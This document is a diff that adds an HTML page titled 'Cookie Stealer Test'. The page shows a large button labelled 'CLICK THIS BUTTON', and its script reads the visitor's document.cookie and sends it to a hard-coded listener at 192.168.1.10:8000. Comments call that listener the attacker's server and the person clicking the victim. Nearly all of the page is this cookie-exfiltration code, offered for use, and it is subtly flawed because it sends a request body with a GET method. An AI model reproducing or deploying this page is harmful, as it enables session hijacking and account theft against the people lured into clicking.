@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cookie Stealer Test</title>
+    <!-- Minimal CSS for a clean, trustworthy look -->
+    <style>
+        body { 
+            font-family: sans-serif; 
+            text-align: center; 
+            padding: 100px; 
+            background-color: #f5f5f5; 
+        }
+        .stealer-button {
+            background-color: #ff4d4d; 
+            color: white; 
+            padding: 20px 50px; 
+            border-radius: 8px; 
+            font-size: 1.8em; 
+            font-weight: bold;
+            text-decoration: none; 
+            display: inline-block;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); 
+            transition: all 0.2s ease;
+        }
+        .stealer-button:hover {
+            background-color: #e03d3d;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</head>
+<body style="height: 100vh;">
+
+    <!-- THE TRIGGER: This is the button the victim will click -->
+    <button 
+        class="stealer-button" 
+        onclick="stealTheCookie();"
+    >
+        CLICK THIS BUTTON
+    </button>
+
+    <!-- The Hidden Code: This JavaScript runs when the button is clicked -->
+    <script>
+        
+        // -------------------------------------------------
+        // 🚨 THE IP IS SET: 192.168.1.10 
+        // -------------------------------------------------
+        const listenerUrl = "http://192.168.1.10:8000/"; 
+        
+        function stealTheCookie() {
+            // 1. Get the cookie value from the victim's browser
+            var stolenCookie = document.cookie;
+
+            // 2. Send the data to the attacker's listening server (via a network request)
+            fetch(listenerUrl, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                // The payload: key=value
+                body: 'cookie_data=' + stolenCookie
+            })
+            .then(response => {
+                // Success confirmation (this appears in the victim's browser console)
+                console.log("✅ Cookie successfully stolen and sent!");
+            })
+            .catch(error => {
+                // Failure message
+                console.error("❌ Error sending cookie. Is your listener server running?", error);
+            });
+        }
+    </script>
+
+</body>
+</html>
